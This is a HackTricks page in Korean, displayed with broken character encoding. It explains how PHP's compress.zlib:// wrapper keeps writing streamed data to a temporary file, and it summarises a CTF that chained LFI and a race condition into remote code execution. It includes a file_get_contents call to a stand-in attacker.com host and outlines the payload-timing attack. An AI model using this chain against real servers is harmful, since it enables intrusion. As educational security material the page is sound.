<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>


## `compress.zlib://` ë° `PHP_STREAM_PREFER_STDIO`

`compress.zlib://` í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ì—´ë¦° íŒŒì¼ì€ `PHP_STREAM_PREFER_STDIO` í”Œë˜ê·¸ì™€ í•¨ê»˜ ë°ì´í„°ë¥¼ ê³„ì† ê¸°ë¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì—°ê²°ì— ë„ì°©í•˜ëŠ” ë°ì´í„°ë¥¼ ë‚˜ì¤‘ì— ë™ì¼í•œ íŒŒì¼ì— ê³„ì† ê¸°ë¡í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ë‹¤ìŒê³¼ ê°™ì€ í˜¸ì¶œì€ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
http://attacker.com/fileì— ëŒ€í•œ ìš”ì²­ì„ ë³´ë‚¼ ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ì„œë²„ëŠ” ìœ íš¨í•œ HTTP ì‘ë‹µìœ¼ë¡œ ìš”ì²­ì— ì‘ë‹µí•  ìˆ˜ ìˆìœ¼ë©°, ì—°ê²°ì„ ìœ ì§€í•œ ì±„ë¡œ ë‚˜ì¤‘ì— ì¶”ê°€ ë°ì´í„°ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë°ì´í„°ëŠ” íŒŒì¼ì— ê¸°ë¡ë©ë‹ˆë‹¤.

ì´ ì •ë³´ëŠ” php-src ì½”ë“œì˜ main/streams/cast.c ë¶€ë¶„ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
## Race Conditionì—ì„œ RCEë¡œ

[**ì´ CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)ëŠ” ì´ì „ íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ì—¬ í•´ê²°ë˜ì—ˆìŠµë‹ˆë‹¤.

ê³µê²©ìëŠ” **í”¼í•´ ì„œë²„ê°€ ê³µê²©ì ì„œë²„ì—ì„œ íŒŒì¼ì„ ì½ëŠ” ì—°ê²°ì„ ì—´ë„ë¡** ë§Œë“­ë‹ˆë‹¤. ì´ ì—°ê²°ì´ ì¡´ì¬í•˜ëŠ” ë™ì•ˆ ê³µê²©ìëŠ” ì„œë²„ì— ì˜í•´ ëˆ„ì¶œëœ ì„ì‹œ íŒŒì¼ì˜ ê²½ë¡œë¥¼ **ìœ ì¶œ**í•©ë‹ˆë‹¤.

**ì—°ê²°**ì´ ì—¬ì „íˆ ì—´ë ¤ ìˆëŠ” ë™ì•ˆ ê³µê²©ìëŠ” ìì‹ ì´ ì œì–´í•˜ëŠ” ì„ì‹œ íŒŒì¼ì„ ë¡œë“œí•˜ëŠ” LFIë¥¼ **ì•…ìš©**í•  ê²ƒì…ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì›¹ ì„œë²„ì—ëŠ” `<?`ë¥¼ í¬í•¨í•˜ëŠ” íŒŒì¼ì„ ë¡œë“œí•˜ëŠ” ê²ƒì„ **ë°©ì§€í•˜ëŠ” ê²€ì‚¬**ê°€ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” **Race Condition**ì„ ì•…ìš©í•  ê²ƒì…ë‹ˆë‹¤. ì—¬ì „íˆ ì—´ë ¤ ìˆëŠ” ì—°ê²°ì—ì„œ **ê³µê²©ì**ëŠ” **ì›¹ ì„œë²„**ê°€ íŒŒì¼ì— ê¸ˆì§€ëœ ë¬¸ìê°€ í¬í•¨ë˜ì–´ ìˆëŠ”ì§€ **í™•ì¸í•œ í›„**ì— **ë‚´ìš©ì„ ë¡œë“œí•˜ê¸° ì „ì— PHP í˜ì´ë¡œë“œë¥¼ ì „ì†¡**í•  ê²ƒì…ë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)ì˜ Race Condition ë° CTF ì„¤ëª…ì„ í™•ì¸í•˜ì„¸ìš”.


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
